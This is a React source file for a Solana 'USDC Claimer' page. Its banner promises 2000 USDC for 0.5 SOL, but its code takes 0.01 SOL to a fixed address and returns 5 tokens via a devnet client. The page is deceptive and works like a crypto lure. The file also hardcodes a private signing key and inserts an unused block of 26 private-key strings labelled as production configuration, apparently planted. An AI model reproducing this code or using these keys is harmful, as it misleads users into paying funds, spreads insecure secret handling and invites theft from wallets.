/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3oFsDXtrGPPmKVr94ijZMRrX2oy1mRwbDQU7UphHxaapbW3Km23SDbmC6npAbpiaHtxfkyUuwuxNYsqeuVY77kDM"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "67pZw5Wfbts4o12KGor97oTPjxfkcPGZpATiQNKGYJTHKLFTYhnxsm5H4SrkBTpXdMwryBWarQtc52pcFxS8yWJa",
  "key1": "2MXnz2PCVJGNzs6MpodXM3LV8WSxvsTmACQgsBg4cmGpWJ5UnmSecqS6BQ7RGGCwz8zRaTwZxmLWAJYZawb4hnHf",
  "key2": "4bCQCDdP6AcpgTU898x9vkbCXc1KxmDPWNNhnQeszZ4QNHhQNi8HJCst4A1nUGBJGDcoDrecKVYHgcgM9wiXNg5b",
  "key3": "2KHVaudghgLVcCgWfKJAmBHVKBkNodaLG13EyBhmruqvncscXpajkC5RdQVLy3sXDztuL2bAvjCmXRBuHrHYrQBK",
  "key4": "4tdsLxNCmm8Tui71BwDgQPsXU2FuRza2hgLLDxidK91f2XnArWP4KS1eVvgok46kpwDHJFB4JF4sg4kJ4745zK78",
  "key5": "FWn8mgAKsPGY3VPUNteZHiTXDHaHwrR9W9BTks3jRZV5Qwex3NdbhtfAxkd21Bec5KXDHMZP4anjgrJG3GRNKP5",
  "key6": "7Byegic5g1GrF9xFogw8dgNWPUDDjx4rAXiik1HUMGSePbQ2RWqh7X4oLk5cmLq1JXiM3GPQ5hJvxN9JuWzjj71",
  "key7": "3AHmoWjnmZSB9g8D6BvH6MfhA31qXewaBXVD2q9paNHm4Jq3nBfgXj7G2C6KAqJ8gTx3WN9MLDh4PC1Lgq43iaFU",
  "key8": "3zWr1UtraeeSP3X3dmfiENhvMkeGrRZGBLfwLuMyNzWczaDkp4ZygYaGUyr3y3hVpqbyxiXiVKmnyXLe1X7SjHHk",
  "key9": "3yeoxieQFi4mb5XwXvkeSm2Y1SLMpjPxpTv8rmWasydQuWos2Qre9swiQw6QMsQ5v43YaYyrbGB3di5RYauPWM2m",
  "key10": "4TT26KesBWcwYprnbq4ZyaVWt9eRsisbp6NPRf36xAm6h3tKyPk5fBR9BrBjBn65oZdrSzYDUnTfQFisWjk8T3NU",
  "key11": "4CDYHhHGnvhNUV1n5gMnuipWtvT2348USr1dQ5sX3zxqGaNVPWXic6KCixV7UcPiXqAT81kHaKtqCwQzuHdNXDFd",
  "key12": "3wdRYCkV6oqDSF3RbsPSm2VssG7wymReFhTb8Ak3KDqsT65wfnhsAjviiFvwazV5G9iFAs4S7X4gp3ihEuMDMdnv",
  "key13": "3pMykXbJcG4Qz2CZxYSpaKQ7oyjz9KrrnLAcudJkT5qFMgTxvTaujPxyZSjqde5qmDjkVXa8STt1Xi51p1j4xCF4",
  "key14": "vhtefErU3nDsuxQCe1QDGVfFV3R8JMWYx3mPWnLSohzkkAoVy5HaXQZYBBAtSrRdJNxEbq98xHqHAb5fvYF3nCw",
  "key15": "2FBMGrYBGbwDp6AJuLWAYKe6CA5X1MHuq5ba1AJhW46KjHyxb6faiN6p9jZcZo4YJsWU4Y3tZ31pA1chdHjMHx8C",
  "key16": "5id8k5it6bLU59s3Lr6tjtG7iGQpdZiv6B77DbpyVfiK6wMAxhnuynTWu2beNedseWbvbjy7q8jMFpfBjrB2ag9V",
  "key17": "5X2vEJCHrY7comDzNQ1NpR1n5xH1Xh8MnttRyjJPipg4nEtRRFDNQxwvsLT8KeMh2x4kwDDWa1QH1jtpU8nKDdjU",
  "key18": "3tcEyHLD4Aba5QgteBCamvizV1GXeMnuk7WDyxDHzA7S3Gw5F1f2FFrE2xQfZpmRrVKd9Qht6rSqrmmwEct1jxgm",
  "key19": "41qfkrxM9vdebtv81Rt4wRtoDkXAXzaRU7a9YT3Dha633dYd7BFD56WZeFSviYW5kA7AsTEdt2xCeAqwf38uKYNw",
  "key20": "8kT8L26kRP9r8bYYvczCifRuZV2JEuHZYEzEuyCfKnPPqPrGqNf54PLGBJxZpMTN28QLotH18Wp2HjeYg8sfBS7",
  "key21": "4pwDncvtQywumJrxaE4dTABZHQUjABv5jM9mda4XbbAdVDoTRAR1X7VqNSxUSz1rNdC5CwWYWQx2VNaNyj2S6E4R",
  "key22": "3H5WEf9XHrwKXFY9naD6U1np75U6MS6iWmGFNU4GYcSRnSyGWGSAY1Ksd8TdbQVHvuFuBYyQrqFiiCFvWiaNaWcn",
  "key23": "4tS6gMKQaPiwxyukA2egN3TZfzi22A18ejNR8GwbaxRwyMx2tRoUyibDmz13jYqLWvCKeswVtssak4Sg8e4wFYEn",
  "key24": "Ksh3vdZ1VReV35WPecZ9YJBqX3DNhP48N9yGnwLkmbyVwjcAFdwaC3Kc9qq47oZbUHjhHuZwDoQ5tTpjWz4LoPq",
  "key25": "25CP2fAq526kCQDx95CytD1F9Dc9kZvRQ8SdP3x1Y62gdC6DYmjmBZESMLZjHCUCRuWXZgxDGenX31SipuMFavuU"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
